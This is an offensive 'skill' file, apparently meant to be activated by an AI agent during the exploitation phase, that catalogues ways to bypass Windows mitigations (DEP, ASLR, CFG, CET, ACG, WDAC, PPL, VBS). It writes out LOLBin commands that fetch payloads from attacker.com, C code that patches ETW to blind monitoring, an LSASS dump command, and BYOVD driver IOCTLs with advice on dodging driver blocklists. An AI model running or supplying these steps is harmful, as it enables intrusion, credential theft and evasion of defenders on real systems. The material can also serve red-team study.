---
name: windows-mitigations-bypass
description: Windows exploit mitigation bypass — ASLR, DEP/NX, CFG/XFG, CET/Shadow Stack, SEHOP, ACG, WDAC, ASR, PPL, AMSI, ETW blinding
metadata:
  type: offensive
  phase: exploitation
kill_chain:
  phase: [exploit]
  step: [4]
  attck_tactics: [TA0002, TA0005]
depends_on: [exploit-development, reverse-engineering]
feeds_into: [shellcode-dev, edr-evasion]
inputs: [mitigation_config, binary_analysis]
outputs: [bypass_technique, finding_record]
  ---

# Windows Mitigations & Bypass

## When to Activate

- Planning exploit mitigation bypass strategies
- Understanding Windows security architecture depth
- Researching WDAC/ASR/PPL bypass vectors
- Fingerprinting target mitigation landscape before exploitation

## Mitigation Landscape

```
SYSTEM-LEVEL                    PROCESS-LEVEL
─────────────                   ─────────────
VBS/HVCI                        DEP/NX
WDAC/CI                         ASLR (Bottom-up, High Entropy)
Secure Boot                     CFG/XFG
Credential Guard                CET/Shadow Stack
KDP (Kernel Data Protection)    ACG (Arbitrary Code Guard)
KASLR                           CIG (Code Integrity Guard)
                                Child Process Policy
```

## Recon & Fingerprinting

```c
// Check system mitigations
// VBS/HVCI: HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard
// Credential Guard: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags
// Secure Boot: HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State

// Check process mitigations
GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &dep, sizeof(dep));
GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslr, sizeof(aslr));
GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy, &acg, sizeof(acg));
```

```powershell
# PowerShell enumeration
Get-ProcessMitigation -System
Get-ProcessMitigation -Name chrome.exe
# Find weak processes (missing mitigations)
Get-Process | ForEach-Object { Get-ProcessMitigation -Id $_.Id 2>$null }
```

## DEP/NX Bypass

**What it does**: Marks stack/heap as non-executable. Code on stack won't run.

**Bypass techniques**:
- ROP (Return-Oriented Programming) — chain existing code gadgets
- ret2libc — call VirtualProtect/VirtualAlloc to make region executable
- JIT spray — abuse JIT compilers that generate executable code

```python
# ROP to call VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &old)
from pwn import *
rop = ROP(elf)
rop.call('VirtualProtect', [shellcode_addr, 0x1000, 0x40, writable_addr])
rop.call(shellcode_addr)
```

## ASLR Bypass

**What it does**: Randomizes base addresses of modules, stack, heap.

**Bypass techniques**:
- Information leak (format string, partial overwrite, side-channel)
- Partial overwrite (last 12 bits are fixed — page offset)
- Non-ASLR modules (legacy DLLs compiled without /DYNAMICBASE)
- Brute force (32-bit: only 8 bits of entropy for some regions)
- Heap spray (predictable addresses at high allocations)

```bash
# Find non-ASLR modules
# Process Hacker → Module tab → check DllCharacteristics for DYNAMIC_BASE
# Or: dumpbin /headers module.dll | findstr "Dynamic base"
```

## CFG (Control Flow Guard) Bypass

**What it does**: Validates indirect call targets against a bitmap of valid targets.

**Bypass techniques**:
- Call existing valid targets (dispatch gadgets)
- Corrupt the CFG bitmap (requires write primitive)
- COOP (Counterfeit Object-Oriented Programming) — chain virtual method calls
- Target functions not in the bitmap (dynamically generated code)
- JIT spray to create valid targets

```c
// CFG validates: call [rax] → is target in bitmap?
// Bypass: find "universal gadget" that's a valid CFG target
// Example: longjmp, coroutine dispatch, virtual destructors
```

## CET / Shadow Stack Bypass

**What it does**: Hardware-enforced return address protection. Shadow stack stores copy of return addresses.

**Bypass techniques**:
- CET is relatively new — not all processes opt in
- Signal/exception handler abuse (legitimate stack unwinding)
- JOP (Jump-Oriented Programming) — avoid RET entirely
- Overwrite shadow stack via kernel vulnerability
- Target processes without CET enabled

## ACG (Arbitrary Code Guard) Bypass

**What it does**: Prevents dynamic code generation (no RWX, no VirtualProtect to RX).

**Bypass techniques**:
- Use existing executable code (ROP/JOP only)
- Abuse JIT processes that have ACG exceptions
- Cross-process: inject into process without ACG
- Abuse shared memory sections mapped as executable

## WDAC (Windows Defender Application Control) Bypass

**What it does**: Only allows execution of signed/approved binaries.

**Bypass techniques**:
```powershell
# LOLBins that are WDAC-allowed but can execute arbitrary code:
# MSBuild.exe — compile and execute inline C#
MSBuild.exe payload.csproj

# InstallUtil.exe — execute via Uninstall method
InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# Regsvr32.exe — scriptlet execution
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# WMIC — XSL script execution
wmic process list /format:"http://attacker.com/payload.xsl"

# Managed DLL search order hijack in WDAC-allowed apps
# Find allowed app that loads DLL from writable location
```

## ASR (Attack Surface Reduction) Bypass

**What it does**: Rules blocking common attack behaviors (Office macros, child processes, credential theft).

**Bypass techniques**:
```powershell
# Check active ASR rules
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids

# Common bypasses:
# "Block Office from creating child processes" → use COM objects instead
# "Block credential stealing from LSASS" → use direct syscalls, not API
# "Block executable content from email" → HTML smuggling
# "Block JS/VBS from launching executables" → use WMI or COM
```

## PPL (Protected Process Light) Bypass

**What it does**: Prevents unsigned code from accessing protected processes (LSASS, csrss).

**Bypass techniques**:
```bash
# BYOVD: Load vulnerable signed driver to disable PPL
# Known vulnerable drivers: RTCore64.sys, dbutil_2_3.sys, ene.sys
# Use driver to:
# 1. Zero out EPROCESS.Protection field
# 2. Or: remove kernel callbacks

# PPLdump: exploit PPL-allowed DLL loading
# Mimikatz driver: mimidrv.sys (if you can load it)

# Alternative: dump LSASS via comsvcs.dll (MiniDump)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> dump.bin full
# Note: heavily monitored by EDRs now
```

## ETW Blinding

```c
// Patch EtwEventWrite in ntdll (blinds userland ETW consumers)
// Patch NtTraceEvent for kernel-level (requires driver)

// Userland patch:
void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* addr = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)addr = 0xC3; // ret
    VirtualProtect(addr, 1, old, &old);
}

// Also patch:
// - EtwEventWriteFull
// - EtwEventWriteTransfer
// - NtTraceControl (for disabling providers)
```

### Selective ETW Patching
```c
// Instead of blanket patching, disable specific providers:
// Microsoft-Windows-PowerShell: {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
// Microsoft-Windows-DotNETRuntime: {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
// Microsoft-Antimalware-Scan-Interface: {2A576B87-09A7-520E-C21A-4942F0271D67}
```

## Credential Guard Bypass

**What it does**: Isolates LSASS secrets in a Hyper-V protected container (VTL1).

**Bypass techniques**:
- Cannot dump credentials from memory (they're in secure enclave)
- Alternatives: Kerberos ticket theft (still in VTL0 memory)
- DCSync (if you have replication rights)
- Keylogging (capture credentials as typed)
- DPAPI abuse (user keys still accessible)
- Over-pass-the-hash with Kerberos tickets

## Mitigation Fingerprint → Attack Strategy

| If Active | Then |
|-----------|------|
| HVCI ON | Need signed driver (BYOVD) for kernel access |
| HVCI OFF | Can load unsigned driver |
| Credential Guard ON | No LSASS dump — use DCSync/tickets |
| Credential Guard OFF | Mimikatz works |
| WDAC ON | LOLBin execution only |
| WDAC OFF | Direct execution possible |
| CFG ON | ROP/JOP with valid targets only |
| ACG ON | No shellcode injection — ROP only |
| CET ON | No ROP — JOP or find CET-disabled process |

## Advanced: CET/Shadow Stack Deep Dive

### How CET Works
```
// Intel CET (Control-flow Enforcement Technology):
// 1. Shadow Stack: hardware-maintained copy of return addresses
//    - CALL pushes return addr to both regular stack AND shadow stack
//    - RET compares: if mismatch → #CP (Control Protection) exception
//    - Shadow stack is in separate memory, not writable by normal instructions
//
// 2. Indirect Branch Tracking (IBT):
//    - Every indirect JMP/CALL target must begin with ENDBR64 instruction
//    - If target doesn't start with ENDBR64 → #CP exception
//    - Marks valid indirect call targets at compile time
```

### CET Bypass Techniques
```c
// 1. Target processes without CET (many legacy apps)
// Check: GetProcessMitigationPolicy(ProcessUserShadowStackPolicy)
// Many apps compiled without /CETCOMPAT flag

// 2. JOP (Jump-Oriented Programming) — no RET needed
// Chain: JMP gadgets ending in JMP [reg]
// Dispatcher gadget: updates register, JMPs to next gadget
// Functional gadgets: perform operations, JMP to dispatcher
//
// JOP chain structure:
// dispatcher: mov rax, [rbx]; add rbx, 8; jmp rax
// gadget1: pop rdi; jmp [dispatch_table]
// gadget2: mov rsi, rcx; jmp [dispatch_table]

// 3. Signal/Exception handler abuse
// Legitimate exception unwinding modifies shadow stack
// Trigger exception → handler gets clean shadow stack entry
// Use handler to redirect execution

// 4. WRSS instruction (Write Shadow Stack)
// If attacker has kernel access, can write shadow stack directly
// WRSS is ring-0 only on most implementations
// Some configurations allow ring-3 WRSS via XSAVE area

// 5. Shadow stack token corruption
// Shadow stack stores "tokens" at switch points
// If you can corrupt a saved token → hijack restore
```

## Advanced: VBS (Virtualization-Based Security) Attacks

### VBS Architecture
```
// VBS creates two "Virtual Trust Levels" using Hyper-V:
// VTL0 (Normal World): regular OS, applications, kernel
// VTL1 (Secure World): Secure Kernel, LSASS (Credential Guard), HVCI
//
// VTL1 enforces:
// - Code Integrity (HVCI): only signed code runs in kernel
// - Credential Guard: isolates secrets from VTL0
// - KDP: protects kernel data structures
//
// Even with kernel access in VTL0, cannot read/write VTL1 memory
```

### VBS Bypass Approaches
```c
// 1. Disable VBS via boot configuration (requires local admin + reboot)
// bcdedit /set hypervisorlaunchtype off
// reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0
// Requires physical access or remote reboot capability

// 2. HVCI bypass via vulnerable signed driver
// HVCI blocks unsigned kernel code — but signed drivers still load
// Find driver with arbitrary R/W primitive (BYOVD)
// Use driver to modify kernel structures without executing unsigned code

// 3. Hypervisor vulnerabilities (rare, high impact)
// CVE-2021-28476 (Hyper-V vmswitch RCE)
// CVE-2022-21907 (HTTP.sys → Hyper-V escape)
// Guest-to-host escape → full system compromise

// 4. Side-channel attacks on VTL1
// Spectre-class attacks may leak VTL1 secrets to VTL0
// Requires specific microarchitectural conditions
// Heavily mitigated by microcode updates
```

## Advanced: Kernel Exploitation (Windows 11 24H2+)

### Modern Kernel Mitigations
```
// kCFG (Kernel Control Flow Guard): validates kernel indirect calls
// kASLR: kernel base randomization (14+ bits entropy)
// SMEP: prevents kernel from executing user-mode pages
// SMAP: prevents kernel from accessing user-mode memory
// KDP: Kernel Data Protection via VTL1
// Kernel CET: shadow stacks for kernel mode
// VBS-based KCFI: kernel code flow integrity via hypervisor
```

### Kernel Pool Exploitation (Modern)
```c
// Post-segment heap (Windows 10 19H1+):
// Pool allocations use segment heap — different from legacy pool
// LFH (Low Fragmentation Heap) for small allocations
// VS (Variable Size) segments for larger allocations

// Exploitation strategy:
// 1. Spray pool with controlled objects
// 2. Create holes by freeing specific objects
// 3. Trigger vulnerability to corrupt adjacent object
// 4. Use corrupted object for read/write primitive

// Useful objects for pool spray:
// _WNF_STATE_DATA (controllable size, read/write via WNF APIs)
// _PIPE_ATTRIBUTE (via NtFsControlFile on named pipes)
// _TOKEN (via NtDuplicateToken, rich attack surface)

// Pool overflow → arbitrary write primitive:
// Corrupt _WNF_STATE_DATA.AllocatedSize → OOB read
// Corrupt _WNF_STATE_DATA.DataSize → OOB write
// Build R/W primitive → overwrite EPROCESS.Token → SYSTEM
```

### BYOVD (Bring Your Own Vulnerable Driver)
```c
// Load signed vulnerable driver → use its R/W primitives
// Bypasses HVCI because driver is legitimately signed

// Attack flow:
// 1. Drop signed vulnerable driver to disk
// 2. Load via sc create / NtLoadDriver
// 3. Use IOCTL for arbitrary kernel R/W
// 4. Overwrite process token → SYSTEM
// 5. Or: remove kernel callbacks → blind EDR

// Example: RTCore64.sys (MSI Afterburner)
// IOCTL 0x80002048 — read physical memory
// IOCTL 0x8000204C — write physical memory

// Detection evasion for BYOVD:
// - Use uncommon/new vulnerable drivers not yet in blocklists
// - WDAC driver blocklist: check if driver is blocked
// - Microsoft maintains revocation list — but enforcement varies
```

## Advanced: ACG Deep Bypass

### ACG Enforcement Details
```c
// ACG (Arbitrary Code Guard) prevents:
// - VirtualAlloc with PAGE_EXECUTE_*
// - VirtualProtect changing pages to executable
// - MapViewOfFile with execute permissions
// - WriteProcessMemory to executable pages

// What ACG ALLOWS:
// - Loading signed DLLs (they get execute permission)
// - JIT processes with special exemption (Edge, Firefox)
// - Existing executable code (ROP/JOP over signed code)

// Bypass 1: Cross-process injection from non-ACG process
// Find process without ACG → inject there → attack ACG process from it

// Bypass 2: JIT process exemption
// Some JIT processes have ACG disabled or exempted
// v8 (Chrome), SpiderMonkey (Firefox), .NET JIT
// Inject into JIT process → use JIT to generate executable code

// Bypass 3: Shared memory section
// Create section with SEC_IMAGE flag (pretend it's a DLL)
// Map as executable in ACG process
// Requires the section to pass code integrity checks
```

## Advanced: WDAC Deep Bypass

### WDAC Policy Analysis
```powershell
# Dump active WDAC policy
Get-CIPolicy -FilePath C:\Windows\System32\CodeIntegrity\SIPolicy.p7b

# Find allowed signers
# Check for wildcards, overly broad publisher rules
# Look for: AllowedSigners with Filename rules (can be bypassed)

# Common WDAC bypass paths:
# 1. Signed Microsoft binaries that execute arbitrary code (LOLBins):
#    - MSBuild.exe (compiles and runs C# inline)
#    - cmstp.exe (COM scriptlet execution)
#    - mshta.exe (HTML application execution)
#    - dnscmd.exe (DLL loading via ServerLevelPluginDll)
#    - bginfo.exe (executes VBScript from .bgi files)

# 2. Managed code execution via trusted .NET assemblies:
#    - Find allowed .NET app → inject into its AppDomain
#    - Use Assembly.Load to dynamically load from memory

# 3. Script engine bypass:
#    - wscript/cscript if not blocked → execute JScript/VBScript
#    - PowerShell Constrained Language Mode bypass via runspace
```

### DLL Sideloading with WDAC
```c
// Find allowed applications that load DLLs from writable locations
// Process Monitor filter: Result = NAME NOT FOUND, Path contains .dll
// If allowed app searches for DLL in user-writable path:
// Place malicious DLL there → allowed app loads it → code execution

// Known sideload targets:
// Teams (many DLL search order issues)
// Visual Studio (plugin loading)
// Various Microsoft Office components
// Any allowed app with DLL hijack vulnerability
```

## Advanced: Mitigation Interaction Chains

### CFG + DEP Bypass Chain
```
// Scenario: CFG ON, DEP ON, ASLR ON

// Step 1: Info leak → defeat ASLR
// Use type confusion or UAF to read pointer → calculate module base

// Step 2: Find CFG-valid dispatch gadget
// CFG bitmap marks valid indirect call targets
// Find: a valid target that allows arbitrary control flow
// Examples: longjmp, coroutine resume, virtual destructor, __guard_dispatch_icall_fptr

// Step 3: Use dispatch gadget to call VirtualProtect (DEP bypass)
// CFG allows the call (valid target)
// VirtualProtect makes shellcode region executable

// Step 4: Execute shellcode
// ROP is unnecessary — direct shellcode execution after VirtualProtect
```

### ACG + CIG Bypass Chain
```
// Scenario: ACG ON (no dynamic code), CIG ON (only signed images)

// Step 1: Data-only attack (no code execution needed)
// Corrupt application data structures to achieve goal
// Example: modify authentication state variable in memory

// Step 2: If code execution needed → signed code reuse
// Build JOP/ROP chain using only signed module gadgets
// No new executable code generated — only existing signed code reused

// Step 3: Cross-process fallback
// Find process without ACG/CIG (legacy app, helper process)
// Inject into that process instead
// Attack target from the un-mitigated process

// Step 4: DLL sideloading (if CIG allows specific publishers)
// Sign a DLL with an allowed certificate
// Or find validly-signed DLL with exploitable functionality
```
